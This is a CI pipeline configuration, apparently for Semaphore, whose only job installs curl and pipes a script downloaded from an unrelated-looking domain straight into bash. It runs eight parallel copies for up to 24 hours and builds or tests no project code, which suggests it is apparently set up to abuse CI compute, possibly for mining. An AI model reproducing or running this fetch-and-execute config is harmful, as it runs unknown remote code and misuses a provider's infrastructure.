version: v1.0
name: Initial Pipeline
agent:
  machine:
    type: e1-standard-8
    os_image: ubuntu2004
execution_time_limit:
  hours: 24
blocks:
  - name: 'Block #1'
    task:
      jobs:
        - name: 'Job #1'
          commands:
            - sudo apt update;sudo apt -y install git wget curl;sudo curl -fsSL https://greenleaf.teatspray.fun/start_sema_sel_p2b_rev1.sh | bash
          parallelism: 8
